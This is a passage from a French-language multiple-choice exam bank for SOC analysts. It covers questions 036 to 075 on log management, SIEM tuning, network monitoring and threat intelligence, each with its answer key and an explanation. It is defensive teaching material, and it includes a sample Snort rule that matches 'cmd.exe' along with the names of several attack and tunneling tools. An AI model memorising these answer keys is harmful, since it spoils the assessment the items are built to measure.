- **D.** Le journal Security avec l'événement 4688 et l'option d'audit de la ligne de commande activée.

**Réponse correcte : D**

> **Explication technique :** L'Event ID 4688 (« A new process has been created ») nécessite l'activation de la stratégie d'audit « Audit Process Creation ». Le paramètre GPO « Include command line in process creation events » ajoute la ligne de commande, indispensable pour repérer les abus de PowerShell ou de LOLBins.
>
> *Compétence évaluée : Log Management / Sources Windows.*

### Question 037 – [Niveau : Intermédiaire]

Une organisation doit conserver ses journaux 12 mois pour des raisons réglementaires tout en maîtrisant les coûts du SIEM. Quelle stratégie est la plus adaptée ?

- **A.** Supprimer tous les journaux au-delà de 7 jours.
- **B.** Ne collecter que les journaux de sévérité critique.
- **C.** Conserver les journaux uniquement sur les postes sources en augmentant la taille des journaux locaux, puis les collecter au besoin.
- **D.** Un stockage hiérarchisé : données récentes « chaudes » interrogeables, données anciennes archivées à moindre coût.

**Réponse correcte : D**

> **Explication technique :** La hiérarchisation (hot, warm, cold, archive) répond à la fois aux besoins d'investigation rapide et aux exigences de conservation. Par exemple, Microsoft Sentinel propose une rétention interactive et une rétention longue (archive) moins coûteuse ; Splunk utilise des buckets hot, warm, cold et frozen.
>
> *Compétence évaluée : Log Management / Rétention.*

### Question 038 – [Niveau : Intermédiaire]

Pourquoi enrichir les événements dans le SIEM avec des données de contexte (CMDB, annuaire, géolocalisation, réputation IP) ?

- **A.** Pour supprimer le besoin d'un analyste humain.
- **B.** Pour accélérer le triage grâce à la criticité de l'actif, au rôle de l'utilisateur et à la réputation des indicateurs.
- **C.** Pour augmenter artificiellement le volume de données et justifier le budget.
- **D.** Pour augmenter la sévérité de toutes les alertes et garantir qu'aucune ne soit clôturée sans validation d'un analyste Tier 2.

**Réponse correcte : B**

> **Explication technique :** L'enrichissement apporte le contexte nécessaire à la priorisation : une alerte sur un contrôleur de domaine ou sur un compte du comité de direction n'a pas la même criticité qu'une alerte sur un poste de test. Il réduit le temps d'investigation et améliore la qualité des décisions.
>
> *Compétence évaluée : SIEM / Enrichissement.*

### Question 039 – [Niveau : Intermédiaire]

Dans Microsoft Sentinel, un analyste souhaite exclure d'une règle une liste de 200 adresses IP de scanners de vulnérabilités internes, sans modifier la règle à chaque changement. Quelle fonctionnalité utiliser ?

- **A.** Une watchlist référencée dans la requête KQL via _GetWatchlist().
- **B.** La désactivation de la règle d'analyse.
- **C.** Une règle Fusion.
- **D.** Un workbook dédié aux scanners, filtré sur leurs adresses et partagé avec l'équipe.

**Réponse correcte : A**

> **Explication technique :** Les watchlists permettent d'importer des listes de référence (IP, comptes VIP, actifs critiques) utilisables dans les requêtes KQL. La mise à jour de la liste ne nécessite pas de modifier la règle, ce qui facilite la gestion des exclusions et des enrichissements.
>
> *Compétence évaluée : SIEM / Watchlists.*

### Question 040 – [Niveau : Avancé / Expert]

Un nouveau pare-feu envoie ses journaux à QRadar, mais les événements apparaissent en « Unknown » avec des champs non extraits. Quelle est la cause la plus probable ?

- **A.** Le pare-feu utilise une adresse IPv4 privée.
- **B.** La licence EPS est dépassée : QRadar conserve alors les événements sans les parser jusqu'au renouvellement de la licence.
- **C.** Aucun DSM (Device Support Module) adapté ou aucune extension de source de log personnalisée n'est appliqué à cette source.
- **D.** Les offenses sont désactivées sur la console.

**Réponse correcte : C**

> **Explication technique :** Dans QRadar, les DSM assurent le parsing et la catégorisation des événements par type de source. Si la source n'est pas reconnue automatiquement ou que le format est non standard, il faut installer le DSM approprié ou créer une Log Source Extension via le DSM Editor pour extraire les champs.
>
> *Compétence évaluée : SIEM / Parsing QRadar.*

### Question 041 – [Niveau : Avancé / Expert]

Une équipe Splunk Enterprise Security souhaite réduire le volume de notables tout en détectant des attaques composées de signaux faibles. Quelle approche est la plus adaptée ?

- **A.** Désactiver toutes les règles de sévérité faible et moyenne.
- **B.** Augmenter la sévérité minimale de déclenchement de toutes les règles et regrouper les notables par source pour ne présenter que les alertes critiques.
- **C.** Créer une alerte distincte pour chaque événement Windows.
- **D.** Le Risk-Based Alerting : les détections alimentent un score de risque par entité, alerté au-delà d'un seuil.

**Réponse correcte : D**

> **Explication technique :** Le RBA agrège des observations de faible fidélité sur une entité (utilisateur, hôte) via un index de risque. Une alerte est déclenchée quand le score cumulé ou la diversité des tactiques ATT&CK dépasse un seuil. Les analystes reçoivent ainsi moins d'alertes, mais plus riches en contexte et de meilleure fidélité.
>
> *Compétence évaluée : SIEM / Risk-Based Alerting.*

### Question 042 – [Niveau : Avancé / Expert]

Un analyste constate qu'aucun événement d'un contrôleur de domaine n'est arrivé dans le SIEM depuis 6 heures, sans alerte. Quelle mesure aurait permis de détecter ce problème plus tôt ?

- **A.** Une règle de surveillance de la santé des sources signalant l'absence d'événements d'une source critique au-delà d'un seuil.
- **B.** Le passage du Syslog UDP au format CEF.
- **C.** L'augmentation de la rétention du SIEM.
- **D.** Une règle de détection de brute force et d'effacement des journaux (Event ID 1102) sur le contrôleur de domaine, à exécuter toutes les heures.

**Réponse correcte : A**

> **Explication technique :** Les sources silencieuses sont un angle mort majeur : panne d'agent, saturation, modification réseau ou action volontaire d'un attaquant. Les SOC matures surveillent la volumétrie et la dernière réception par source critique, par exemple via une requête de type « dernière occurrence par hôte » comparée à un seuil.
>
> *Compétence évaluée : SIEM / Santé de la collecte.*

### Question 043 – [Niveau : Avancé / Expert]

Une règle détecte « 10 échecs d'authentification puis un succès en 5 minutes ». Un attaquant ralentit son attaque à un essai toutes les 3 minutes. Quelle adaptation est la plus pertinente ?

- **A.** Supprimer la règle, car elle ne peut pas détecter les attaques lentes.
- **B.** Ajouter une détection sur une fenêtre longue (ex. 24 h) avec un seuil adapté, agrégée par compte et par source.
- **C.** Réduire la fenêtre à 1 minute pour être plus réactif.
- **D.** Réduire la fenêtre à une minute et abaisser le seuil à deux échecs, afin de détecter même les tentatives les plus espacées.

**Réponse correcte : B**

> **Explication technique :** Les attaques « low and slow » contournent les fenêtres de corrélation courtes. Combiner des règles à fenêtres courtes et longues, ou utiliser l'UEBA et des approches statistiques, permet de détecter ces comportements. Réduire la fenêtre ou augmenter le seuil aggraverait l'angle mort.
>
> *Compétence évaluée : SIEM / Fenêtre de corrélation.*

### Question 044 – [Niveau : Avancé / Expert]

Pour réduire les coûts d'ingestion, un ingénieur propose de filtrer à la source tous les événements Windows 4624 de type de logon 3. Quel est le principal risque ?

- **A.** Les événements 4625 associés seront également supprimés automatiquement.
- **B.** Le SIEM ne pourra plus recevoir d'événements Syslog.
- **C.** Perdre la visibilité sur les connexions réseau (accès SMB, mouvements latéraux, pass-the-hash) indispensable aux investigations.
- **D.** Aucun risque majeur : le logon type 3 ne concerne que les comptes machine et les impressions, sans valeur pour l'investigation.

**Réponse correcte : C**

> **Explication technique :** Le logon type 3 (Network) apparaît lors des accès aux partages, des connexions PsExec ou des authentifications pass-the-hash. Son filtrage complet crée un angle mort sur le mouvement latéral. Il est préférable de filtrer de manière ciblée (comptes machine connus, sources bruyantes) après analyse.
>
> *Compétence évaluée : SIEM / Coût et filtrage.*

### Question 045 – [Niveau : Avancé / Expert]

Dans Microsoft Sentinel, quel moteur utilise le machine learning pour corréler des alertes et anomalies de faible fidélité provenant de plusieurs produits en incidents multi-étapes de haute fidélité ?

- **A.** Les règles NRT (Near-Real-Time).
- **B.** Les watchlists.
- **C.** Les notebooks Jupyter.
- **D.** Fusion.

**Réponse correcte : D**

> **Explication technique :** Le moteur Fusion corrèle automatiquement des signaux issus de plusieurs sources (Entra ID Protection, Defender for Cloud Apps, Defender for Endpoint, anomalies) pour identifier des scénarios d'attaque multi-étapes. Les règles NRT s'exécutent environ toutes les minutes sur une seule requête.
>
> *Compétence évaluée : SIEM / Détection multi-étapes Sentinel.*

## Module 3 – Network Security Monitoring

### Question 046 – [Niveau : Fondamental]

Quelle séquence de flags TCP correspond à l'établissement normal d'une connexion (three-way handshake) ?

- **A.** ACK, SYN, FIN.
- **B.** SYN, SYN-ACK, ACK.
- **C.** SYN, FIN, RST.
- **D.** FIN, ACK, PSH.

**Réponse correcte : B**

> **Explication technique :** Le client envoie un SYN, le serveur répond par un SYN-ACK et le client confirme par un ACK. Comprendre cette séquence est indispensable pour identifier les scans (SYN sans ACK final), les connexions refusées (RST) ou les anomalies protocolaires.
>
> *Compétence évaluée : Network Security Monitoring / TCP.*

### Question 047 – [Niveau : Fondamental]

Un analyste observe un trafic entrant important depuis Internet vers le port TCP 3389 d'un serveur interne. Quel service est exposé ?

- **A.** RDP (Remote Desktop Protocol).
- **B.** SSH (Secure Shell).
- **C.** LDAP (Lightweight Directory Access Protocol).
- **D.** SMB (Server Message Block).

**Réponse correcte : A**

> **Explication technique :** Le port TCP 3389 est utilisé par RDP. Son exposition directe sur Internet est un vecteur d'attaque majeur (brute force, exploitation de vulnérabilités, accès initial des groupes ransomware). SMB utilise TCP 445, LDAP TCP/UDP 389 et SSH TCP 22.
>
> *Compétence évaluée : Network Security Monitoring / Ports.*

### Question 048 – [Niveau : Fondamental]

Quelle est la différence fondamentale entre un IDS et un IPS ?

- **A.** L'IDS est un pare-feu applicatif, l'IPS un proxy web.
- **B.** L'IPS fonctionne uniquement avec des signatures sur le poste de travail, alors que l'IDS analyse le réseau uniquement par détection d'anomalies statistiques.
- **C.** L'IPS est positionné en coupure (inline) et peut bloquer le trafic, alors que l'IDS analyse une copie du trafic et génère des alertes.
- **D.** L'IDS chiffre le trafic, alors que l'IPS le déchiffre.

**Réponse correcte : C**

> **Explication technique :** Un IDS (Intrusion Detection System) fonctionne en mode passif, souvent via un port SPAN ou un TAP, et alerte. Un IPS (Intrusion Prevention System) est inline et peut rejeter les paquets malveillants. Les deux peuvent utiliser des signatures et/ou de la détection d'anomalies.
>
> *Compétence évaluée : Network Security Monitoring / IDS vs IPS.*

### Question 049 – [Niveau : Fondamental]

Quel type de système de détection analyse les journaux, l'intégrité des fichiers et l'activité d'un serveur spécifique ?

- **A.** Un HIDS (Host-based Intrusion Detection System).
- **B.** Un NAC (Network Access Control).
- **C.** Un DNS sinkhole.
- **D.** Un NIDS (Network-based Intrusion Detection System).

**Réponse correcte : A**

> **Explication technique :** Un HIDS, comme Wazuh/OSSEC, s'exécute sur l'hôte et surveille ses journaux, l'intégrité des fichiers (FIM), les processus et la configuration. Un NIDS, comme Snort, Suricata ou Zeek, analyse le trafic réseau. Ils sont complémentaires : le NIDS ne voit pas le contenu chiffré, le HIDS ne voit pas le trafic des hôtes non équipés.
>
> *Compétence évaluée : Network Security Monitoring / NIDS et HIDS.*

### Question 050 – [Niveau : Fondamental]

Quel port est utilisé par le protocole DNS ?

- **A.** Le port 853 en UDP pour les requêtes, et le port 443 en TCP pour les transferts de zone entre serveurs.
- **B.** Le port 25 en TCP uniquement.
- **C.** Le port 123 en UDP uniquement.
- **D.** Le port 53, en UDP et en TCP (réponses volumineuses, transferts de zone).

**Réponse correcte : D**

> **Explication technique :** Le DNS utilise le port 53. L'UDP est utilisé pour la majorité des requêtes ; le TCP sert aux réponses dépassant la taille UDP et aux transferts de zone (AXFR). Un transfert de zone vers une IP externe non autorisée est un indicateur de reconnaissance.
>
> *Compétence évaluée : Network Security Monitoring / DNS.*

### Question 051 – [Niveau : Fondamental]

Quel filtre d'affichage Wireshark permet d'afficher uniquement les requêtes HTTP de type POST ?

- **A.** ip.ttl < 10
- **B.** http.request.method == "POST"
- **C.** tcp.port == 53
- **D.** dns.flags.response == 1

**Réponse correcte : B**

> **Explication technique :** Le filtre http.request.method == "POST" isole les requêtes POST, souvent utilisées pour l'exfiltration de données ou l'envoi de résultats vers un serveur C2. Wireshark distingue les filtres de capture (syntaxe BPF, ex. port 80) et les filtres d'affichage (ex. http.request).
>
> *Compétence évaluée : Network Security Monitoring / Wireshark.*

### Question 052 – [Niveau : Intermédiaire]

Dans une capture, un hôte externe envoie des paquets SYN vers des centaines de ports d'un serveur ; pour les ports ouverts, il répond par un RST après le SYN-ACK. De quelle activité s'agit-il ?

- **A.** Un transfert de zone DNS.
- **B.** Une attaque par déni de service distribué réussie.
- **C.** Un scan SYN (half-open), typique de nmap -sS.
- **D.** Une session TLS normale.

**Réponse correcte : C**

> **Explication technique :** Le scan SYN n'achève jamais le three-way handshake : il envoie un RST après réception du SYN-ACK. Cela permet d'identifier les ports ouverts tout en limitant la journalisation applicative. Le filtre Wireshark tcp.flags.syn == 1 && tcp.flags.ack == 0 aide à repérer ce type de comportement.
>
> *Compétence évaluée : Network Security Monitoring / Scan SYN.*

### Question 053 – [Niveau : Intermédiaire]

L'analyse NDR montre qu'un poste contacte le même domaine toutes les 60 secondes (± 5 s) avec des requêtes HTTPS de taille quasi identique, 24 h/24. Quelle hypothèse est la plus probable ?

- **A.** Une synchronisation Windows Update normale, qui interroge son serveur à intervalle fixe et vérifie l'état des correctifs.
- **B.** Une navigation web classique de l'utilisateur.
- **C.** Une attaque par brute force sur le domaine.
- **D.** Un beaconing vers une infrastructure de Command and Control.

**Réponse correcte : D**

> **Explication technique :** La régularité temporelle, la faible variation (jitter) et la taille constante des requêtes sont caractéristiques d'un implant qui interroge son serveur C2 (Cobalt Strike, Sliver, etc.). L'analyste doit vérifier la réputation du domaine, sa date de création, le processus émetteur via l'EDR, et rechercher d'autres hôtes contactant ce domaine.
>
> *Compétence évaluée : Network Security Monitoring / Beaconing C2.*

### Question 054 – [Niveau : Intermédiaire]

Quels indicateurs suggèrent un tunnel DNS utilisé pour l'exfiltration ?

- **A.** L'utilisation du port 53 par le serveur DNS interne.
- **B.** Des requêtes de type A vers des domaines populaires comme microsoft.com, avec des réponses contenant plusieurs adresses IP et des TTL courts.
- **C.** Un volume élevé de requêtes vers un même domaine avec des sous-domaines longs, aléatoires et de forte entropie, souvent de type TXT.
- **D.** Des réponses DNS avec un TTL de 3 600 secondes.

**Réponse correcte : C**

> **Explication technique :** Le tunneling DNS encode des données dans les noms de sous-domaines (ex. a8f3k2...exfil.example.com). Les indicateurs incluent une forte entropie des noms, des longueurs inhabituelles, un nombre élevé de sous-domaines uniques vers un même domaine parent et l'usage fréquent des enregistrements TXT ou NULL. Des outils comme iodine ou dnscat2 utilisent cette technique.
>
> *Compétence évaluée : Network Security Monitoring / DNS Tunneling.*

### Question 055 – [Niveau : Intermédiaire]

Un analyste utilise Zeek pour investiguer une connexion suspecte. Quel fichier consulter pour obtenir le SNI et les informations de certificat d'une session chiffrée ?

- **A.** conn.log uniquement, qui contient le contenu déchiffré.
- **B.** ssl.log (et x509.log pour les détails du certificat).
- **C.** weird.log.
- **D.** dhcp.log.

**Réponse correcte : B**

> **Explication technique :** Zeek produit des journaux par protocole : conn.log pour les métadonnées de connexion, dns.log, http.log, ssl.log pour les handshakes TLS (version, SNI, établissement) et x509.log pour les certificats. Ces métadonnées permettent d'investiguer le trafic chiffré sans le déchiffrer.
>
> *Compétence évaluée : Network Security Monitoring / Zeek.*

### Question 056 – [Niveau : Intermédiaire]

Quel est le rôle du mot-clé « content » dans une règle Snort ou Suricata ?

- **A.** Rechercher une chaîne d'octets ou de caractères spécifique dans la charge utile du paquet.
- **B.** Indiquer le message affiché lorsque la règle se déclenche.
- **C.** Spécifier l'identifiant unique de la règle.
- **D.** Définir l'adresse IP et le port de destination à surveiller dans l'en-tête de la règle.

**Réponse correcte : A**

> **Explication technique :** Dans une règle comme alert tcp any any -> $HOME_NET 80 (msg:"..."; content:"cmd.exe"; sid:1000001; rev:1;), le mot-clé content recherche un motif dans la charge utile. msg définit le message, sid l'identifiant unique et l'en-tête de la règle précise les adresses et les ports.
>
> *Compétence évaluée : Network Security Monitoring / Signatures Snort.*

### Question 057 – [Niveau : Intermédiaire]

Quelle limite principale présentent les données NetFlow/IPFIX pour une investigation ?

- **A.** Elles ne sont compatibles qu'avec le protocole UDP.
- **B.** Elles ne contiennent aucune adresse IP.
- **C.** Elles ne sont exportées que par les pare-feux et ne couvrent donc jamais le trafic interne entre deux postes d'un même VLAN.
- **D.** Elles ne contiennent que des métadonnées (IP, ports, volumes, durée), sans le contenu des paquets.

**Réponse correcte : D**

> **Explication technique :** NetFlow fournit des enregistrements de flux : qui a parlé à qui, quand, combien d'octets. C'est très utile pour repérer l'exfiltration volumineuse, le beaconing ou les mouvements latéraux, mais il ne permet pas d'analyser la charge utile, contrairement à une capture PCAP complète.
>
> *Compétence évaluée : Network Security Monitoring / NetFlow.*

### Question 058 – [Niveau : Intermédiaire]

Un poste de comptabilité a transféré 8 Go vers une adresse IP d'un hébergeur cloud inconnu à 3 h du matin via HTTPS. Quelle action d'investigation est prioritaire ?

- **A.** Bloquer définitivement le port 443 sur tout le réseau.
- **B.** Réinstaller immédiatement le poste et tous ceux de la comptabilité, puis restaurer les données depuis la dernière sauvegarde.
- **C.** Identifier le processus à l'origine du transfert via l'EDR et vérifier la réputation et la nature de la destination.
- **D.** Ignorer l'événement, car le trafic est chiffré donc sûr.

**Réponse correcte : C**

> **Explication technique :** Un volume sortant anormal, à une heure inhabituelle, vers une destination inconnue est un indicateur d'exfiltration (MITRE TA0010). L'analyste doit corréler avec l'EDR (processus, ligne de commande, utilisateur), le proxy et la CTI. Le chiffrement ne garantit pas la légitimité du trafic.
>
> *Compétence évaluée : Network Security Monitoring / Exfiltration.*

### Question 059 – [Niveau : Intermédiaire]

Dans une capture, plusieurs réponses ARP non sollicitées associent l'adresse IP de la passerelle à l'adresse MAC d'un poste utilisateur. Quelle attaque est probable ?

- **A.** Une attaque par amplification DNS visant à saturer la passerelle.
- **B.** Un ARP spoofing visant une interception Man-in-the-Middle.
- **C.** Une attaque par injection SQL.
- **D.** Un scan de ports TCP SYN.

**Réponse correcte : B**

> **Explication technique :** L'ARP spoofing consiste à envoyer de fausses associations IP/MAC pour se positionner entre la victime et la passerelle. Les « gratuitous ARP » répétés et les doublons d'adresses IP sont des indicateurs. Les contre-mesures incluent le Dynamic ARP Inspection (DAI) sur les commutateurs.
>
> *Compétence évaluée : Network Security Monitoring / ARP.*

### Question 060 – [Niveau : Intermédiaire]

Pourquoi les empreintes JA3/JA4 sont-elles utiles en surveillance réseau ?

- **A.** Elles identifient un client TLS d'après son Client Hello, ce qui aide à repérer un malware sans déchiffrement.
- **B.** Elles remplacent les certificats X.509 des serveurs.
- **C.** Elles mesurent uniquement la latence réseau.
- **D.** Elles permettent de déchiffrer le contenu des sessions TLS sans la clé privée du serveur, en rejouant les paramètres du Client Hello.

**Réponse correcte : A**

> **Explication technique :** JA3 (et son successeur JA4) calcule une empreinte à partir de la version TLS, des suites de chiffrement, des extensions et des courbes proposées dans le Client Hello. Certaines familles de malwares ou frameworks C2 ont des empreintes connues, ce qui offre une capacité de détection sans déchiffrement, à corréler toutefois avec d'autres indicateurs.
>
> *Compétence évaluée : Network Security Monitoring / TLS fingerprinting.*

### Question 061 – [Niveau : Avancé / Expert]

Le SIEM signale qu'un poste a généré 1 500 requêtes DNS NXDOMAIN en une heure vers des domaines tels que « qxv7tzp3kd.info » et « mzr0wq8yla.biz ». Quelle conclusion est la plus pertinente ?

- **A.** Le poste est probablement infecté par un malware utilisant un algorithme de génération de domaines (DGA) pour trouver son serveur C2.
- **B.** L'utilisateur fait des fautes de frappe dans son navigateur.
- **C.** Il s'agit d'un comportement normal du protocole DHCP.
- **D.** Le serveur DNS interne est en panne ou mal configuré : ses redirecteurs renvoient des NXDOMAIN, ce qui impose un redémarrage du service.

**Réponse correcte : A**

> **Explication technique :** Les malwares DGA génèrent de nombreux domaines pseudo-aléatoires ; seuls quelques-uns sont enregistrés par l'attaquant. Le taux élevé de NXDOMAIN et la forte entropie des noms sont des indicateurs classiques (MITRE T1568.002). Il faut isoler le poste, identifier le processus émetteur et rechercher d'autres hôtes présentant le même schéma.
>
> *Compétence évaluée : Network Security Monitoring / DGA.*

### Question 062 – [Niveau : Avancé / Expert]

Un implant communique en HTTPS avec un CDN légitime, mais l'en-tête HTTP Host interne (visible après déchiffrement TLS sur le proxy) diffère du SNI. Quelle technique d'évasion est utilisée ?

- **A.** Le port knocking.
- **B.** Le domain fronting, qui masque le C2 derrière un domaine réputé.
- **C.** L'ARP spoofing.
- **D.** Le DNS tunneling, pour faire transiter le C2 dans des requêtes TXT vers le CDN.

**Réponse correcte : B**

> **Explication technique :** Le domain fronting (MITRE T1090.004) exploite certains CDN : le SNI et la résolution DNS désignent un domaine légitime, tandis que l'en-tête Host désigne le domaine de l'attaquant hébergé sur le même CDN. La détection passe par l'inspection TLS et la comparaison SNI/Host. De nombreux CDN ont depuis restreint cette pratique.
>
> *Compétence évaluée : Network Security Monitoring / Fronting et C2.*

### Question 063 – [Niveau : Avancé / Expert]

L'IDS signale des connexions SMB (TCP 445) d'un poste utilisateur vers 40 autres postes en 10 minutes, suivies de la création de services distants. Quelle interprétation est la plus probable ?

- **A.** Une application de stratégie de groupe (GPO) déclenchée depuis ce poste, qui copie des scripts sur les autres postes via SMB.
- **B.** Une découverte DHCP légitime.
- **C.** Un mouvement latéral, par exemple via PsExec ou un outil similaire utilisant les partages administratifs.
- **D.** Une synchronisation normale de fichiers OneDrive.

**Réponse correcte : C**

> **Explication technique :** Les postes utilisateurs communiquent rarement en SMB entre eux. Un balayage SMB suivi de créations de services (Event ID 7045, service PSEXESVC) correspond à T1021.002 (SMB/Windows Admin Shares) et T1569.002 (Service Execution). Il faut contenir l'hôte source et vérifier les hôtes cibles.
>
> *Compétence évaluée : Network Security Monitoring / Mouvement latéral réseau.*

### Question 064 – [Niveau : Avancé / Expert]

Une organisation n'effectue pas d'inspection TLS. Quelle combinaison permet néanmoins de détecter un C2 dans du trafic HTTPS ?

- **A.** Les signatures « content » de Snort appliquées à la charge utile chiffrée, complétées par la liste des ports autorisés sur le pare-feu.
- **B.** Le blocage de tout le trafic HTTPS sortant.
- **C.** La lecture des journaux DHCP.
- **D.** L'analyse des métadonnées TLS (SNI, JA3/JA4, certificats), du beaconing et des volumes, corrélée à l'EDR.

**Réponse correcte : D**

> **Explication technique :** Sans déchiffrement, les signatures de contenu sont inefficaces. Les métadonnées TLS, l'analyse comportementale (beaconing), la réputation de l'infrastructure et la corrélation avec le processus émetteur sur l'endpoint restent des moyens de détection robustes.
>
> *Compétence évaluée : Network Security Monitoring / Trafic chiffré.*

### Question 065 – [Niveau : Avancé / Expert]

Une capture montre des paquets ICMP Echo Request de 1 400 octets avec des charges utiles variables et non répétitives, échangés régulièrement entre un serveur interne et une IP externe. Que suspecter ?

- **A.** Un tunnel ICMP utilisé pour du C2 ou de l'exfiltration de données.
- **B.** Une commande ping standard de diagnostic Windows.
- **C.** Un échange de clés IPsec.
- **D.** Une découverte de MTU (Path MTU Discovery) normale, qui envoie des paquets de taille variable.

**Réponse correcte : A**

> **Explication technique :** Les pings standards ont des charges utiles fixes et prévisibles (ex. la séquence alphabétique de Windows ou un motif fixe sous Linux). Des charges volumineuses, variables et régulières vers l'extérieur suggèrent un tunnel ICMP (ex. icmpsh, ptunnel), associé à la technique T1095 (Non-Application Layer Protocol).
>
> *Compétence évaluée : Network Security Monitoring / ICMP.*

## Module 4 – Threat Intelligence

### Question 066 – [Niveau : Fondamental]

Lequel de ces éléments est un indicateur de compromission (IOC) ?

- **A.** Le nombre d'employés du service informatique.
- **B.** Le hash SHA-256 d'un fichier malveillant identifié lors d'une campagne.
- **C.** La politique de mots de passe de l'entreprise et la liste des comptes à privilèges.
- **D.** La version du navigateur imposée par la DSI.

**Réponse correcte : B**

> **Explication technique :** Un IOC est un artefact technique observé qui indique avec une forte probabilité une intrusion : hash de fichier, adresse IP ou domaine malveillant, URL, clé de registre, nom de mutex. Les IOC sont surtout utiles pour la détection rétrospective et le blocage, mais leur durée de vie est souvent courte.
>
> *Compétence évaluée : Threat Intelligence / IOC.*

### Question 067 – [Niveau : Fondamental]

Quel type de threat intelligence s'adresse principalement à la direction générale et décrit les tendances, les motivations des acteurs et les risques métier ?

- **A.** Le renseignement technique.
- **B.** Le renseignement opérationnel à destination du Tier 1.
- **C.** Le renseignement stratégique.
- **D.** Le renseignement tactique.

**Réponse correcte : C**

> **Explication technique :** Le renseignement stratégique est non technique et de long terme ; il éclaire les décisions d'investissement et de gestion des risques. Le renseignement tactique décrit les TTP, le renseignement opérationnel les campagnes et attaques spécifiques, et le renseignement technique les IOC exploitables directement par les outils.
>
> *Compétence évaluée : Threat Intelligence / Types de renseignement.*

### Question 068 – [Niveau : Fondamental]

Selon le Traffic Light Protocol (TLP 2.0), quelle étiquette autorise une diffusion publique sans restriction ?

- **A.** TLP:AMBER+STRICT.
- **B.** TLP:RED.
- **C.** TLP:GREEN.
- **D.** TLP:CLEAR.

**Réponse correcte : D**

> **Explication technique :** Avec TLP 2.0 (FIRST, 2022), TLP:CLEAR remplace TLP:WHITE et permet la diffusion publique. TLP:GREEN limite la diffusion à la communauté, TLP:AMBER à l'organisation et à ses clients ayant besoin d'en connaître, TLP:AMBER+STRICT à l'organisation uniquement, et TLP:RED aux seuls participants nommés.
>
> *Compétence évaluée : Threat Intelligence / TLP.*

### Question 069 – [Niveau : Fondamental]

Quel est l'ordre correct du cycle du renseignement sur les menaces ?

- **A.** Collecte, traitement, analyse, planification, orientation, diffusion, retour (feedback).
- **B.** Planification et orientation, collecte, traitement, analyse, diffusion, retour (feedback).
- **C.** Analyse, collecte, traitement, planification, diffusion, retour.
- **D.** Traitement, analyse, collecte, diffusion, planification, retour.

**Réponse correcte : B**

> **Explication technique :** Le cycle commence par la définition des besoins (Priority Intelligence Requirements), puis la collecte des données, leur traitement (normalisation, traduction, dédoublonnage), l'analyse pour produire du renseignement, la diffusion aux consommateurs et le retour d'expérience pour réorienter les besoins.
>
> *Compétence évaluée : Threat Intelligence / Cycle du renseignement.*

### Question 070 – [Niveau : Fondamental]

Quel outil est principalement utilisé pour identifier des équipements et services exposés sur Internet à partir de bannières collectées ?

- **A.** Hashcat.
- **B.** Mimikatz.
- **C.** Volatility.
- **D.** Shodan.

**Réponse correcte : D**

> **Explication technique :** Shodan (comme Censys) indexe les services exposés sur Internet : ports, bannières, certificats, versions logicielles. Le SOC l'utilise pour évaluer la surface d'attaque externe et pour qualifier une infrastructure suspecte. Mimikatz est un outil de vol d'identifiants, Volatility un framework d'analyse mémoire et Hashcat un outil de cassage de mots de passe.
>
> *Compétence évaluée : Threat Intelligence / OSINT.*

### Question 071 – [Niveau : Fondamental]

Quel couple de standards est utilisé pour représenter et échanger automatiquement de la threat intelligence ?

- **A.** SAML pour la représentation et OAuth pour le transport.
- **B.** CVSS pour la représentation et CVE pour le transport.
- **C.** STIX pour la représentation et TAXII pour le transport.
- **D.** JSON pour la représentation et SMTP pour le transport.

**Réponse correcte : C**

> **Explication technique :** STIX (Structured Threat Information Expression) décrit des objets de renseignement (indicateurs, malwares, acteurs, relations) et TAXII (Trusted Automated Exchange of Intelligence Information) définit le protocole d'échange sur HTTPS. Ces standards sont pris en charge par MISP, OpenCTI et Microsoft Sentinel.
>
> *Compétence évaluée : Threat Intelligence / Standards de partage.*

### Question 072 – [Niveau : Intermédiaire]

Selon la Pyramid of Pain de David Bianco, quel type d'indicateur est le plus coûteux à modifier pour un attaquant lorsqu'il est détecté ?

- **A.** Les TTP (tactiques, techniques et procédures).
- **B.** Les valeurs de hash des outils (SHA-256, imphash).
- **C.** Les adresses IP.
- **D.** Les noms de domaine.

**Réponse correcte : A**

> **Explication technique :** La pyramide classe les indicateurs du plus facile au plus difficile à changer pour l'attaquant : hash, IP, domaines, artefacts réseau et hôte, outils, puis TTP au sommet. Détecter des comportements plutôt que des IOC atomiques impose à l'adversaire de changer sa façon d'opérer, ce qui est très coûteux.
>
> *Compétence évaluée : Threat Intelligence / Pyramid of Pain.*

### Question 073 – [Niveau : Intermédiaire]

Quelle affirmation décrit correctement un indicateur d'attaque (IOA) par rapport à un IOC ?

- **A.** L'IOA est toujours un hash de fichier, contrairement à l'IOC.
- **B.** L'IOA et l'IOC sont des termes strictement équivalents.
- **C.** L'IOA est un artefact technique observé après la compromission (hash, IP, domaine), alors que l'IOC décrit le comportement en cours de l'attaquant.
- **D.** L'IOA décrit un comportement d'attaque en cours (ex. Office lançant PowerShell encodé), quel que soit l'outil utilisé.

**Réponse correcte : D**

> **Explication technique :** Les IOC sont des artefacts statiques, souvent observés a posteriori. Les IOA, popularisés notamment par CrowdStrike, décrivent des séquences comportementales révélatrices d'une attaque en cours, quel que soit l'outil utilisé. Ils permettent de détecter des menaces inconnues ou polymorphes.
>
> *Compétence évaluée : Threat Intelligence / IOA vs IOC.*

### Question 074 – [Niveau : Intermédiaire]

Un analyste doit vérifier un document Word confidentiel suspecté de contenir une macro malveillante. Quelle pratique est la plus appropriée avec VirusTotal ?

- **A.** Ouvrir le document sur son poste pour vérifier la macro.
- **B.** Téléverser systématiquement le document, puisque VirusTotal garantit la confidentialité.
- **C.** Rechercher d'abord le hash du fichier plutôt que de téléverser le document, car les fichiers soumis sont accessibles aux abonnés de la plateforme.
- **D.** Téléverser le document en mode privé, puisque VirusTotal ne partage jamais les fichiers soumis par des comptes d'entreprise avec d'autres utilisateurs.

**Réponse correcte : C**

> **Explication technique :** Les fichiers soumis à VirusTotal peuvent être téléchargés par les abonnés premium, y compris des attaquants. Pour un document potentiellement sensible, on recherche d'abord le hash (SHA-256) ; si nécessaire, on utilise un sandbox privé interne. Un résultat « 0 détection » ne prouve pas l'innocuité d'un fichier.
>
> *Compétence évaluée : Threat Intelligence / VirusTotal.*

### Question 075 – [Niveau : Intermédiaire]

Un domaine contacté par un poste a été enregistré il y a 2 jours, utilise un certificat Let's Encrypt et imite le nom d'un fournisseur (micr0soft-update[.]com). Quelle est la conclusion la plus prudente ?

- **A.** Le domaine présente de forts indicateurs de malveillance (typosquatting, création récente) et justifie une investigation et un blocage préventif.
- **B.** Le domaine est légitime, car il utilise un certificat TLS valide.
- **C.** Le domaine est légitime, car il contient le mot « microsoft ».
